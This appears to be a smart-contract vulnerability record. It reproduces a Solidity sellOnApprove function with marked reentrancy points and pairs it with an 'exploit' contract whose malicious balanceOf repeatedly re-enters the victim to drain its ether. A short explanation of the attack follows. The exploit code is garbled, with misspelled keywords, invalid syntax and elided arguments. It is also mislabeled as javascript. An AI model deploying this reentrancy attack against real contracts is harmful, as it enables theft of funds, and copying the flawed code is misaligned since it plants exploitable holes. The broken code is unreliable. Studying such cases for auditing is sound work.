## Vulnerable Code

```javascript
**Instance1:**
function sellOnApprove(
    IMultiToken _mtkn,
    uint256 _amount,
    ERC20 _throughToken,
    address[] _exchanges,
    bytes _datas,
    uint[] _datasIndexes, // including 0 and LENGTH values
    address _for
)
    public
{
    if (_throughToken == address(0)) {
        require(_mtkn.tokensCount() == _exchanges.length, "sell: _mtkn should have the same tokens count as _exchanges");
    } else {
        require(_mtkn.tokensCount() + 1 == _exchanges.length, "sell: _mtkn should have tokens count + 1 equal _exchanges length");
    }
    require(_datasIndexes.length == _exchanges.length + 1, "sell: _datasIndexes should start with 0 and end with LENGTH");

    _mtkn.transferFrom(msg.sender, this, _amount);
    _mtkn.unbundle(this, _amount);

    for (uint i = 0; i < _exchanges.length; i++) {
        bytes memory data = new bytes(_datasIndexes[i + 1] - _datasIndexes[i]);
        for (uint j = _datasIndexes[i]; j < _datasIndexes[i + 1]; j++) {
            data[j - _datasIndexes[i]] = _datas[j];
        }
        if (data.length == 0) {
            continue;
        }

        if (i == _exchanges.length - 1 && _throughToken != address(0)) {
            if (_throughToken.allowance(this, _exchanges[i]) == 0) {
                _throughToken.asmApprove(_exchanges[i], uint256(-1));
            }
        } else {
            ERC20 token = _mtkn.tokens(i);
            if (_exchanges[i] == 0) {
                token.asmTransfer(_for, token.balanceOf(this));
                continue;
            }
            if (token.allowance(this, _exchanges[i]) == 0) {
                token.asmApprove(_exchanges[i], uint256(-1));
            }
        }
        // solium-disable-next-line security/no-low-level-calls
        require(_exchanges[i].call(data), "sell: exchange arbitrary call failed");
    }

    _for.transfer(address(this).balance);   //vulnerability position_1
    if (_throughToken != address(0) && _throughToken.balanceOf(this) > 0) {     //vulnerability position_2       
        _throughToken.asmTransfer(_for, _throughToken.balanceOf(this));
    }
}


**Instance_2**

```


## Exploit Code

```javascript
Contract ERC20{

}
Contract Attack is ERC20{
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton balanceof(address _address) payable{
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(“sellOnApprove(IMultiToken , uint256,  ERC20,  address[],  bytes,  uint[],  address)”)), ..., ..., ERC20(this), ..., ..., ..., this );
        }
    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position_2:   IF _throughToken object obtained from a malicious address, the method of balanceOf can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim 

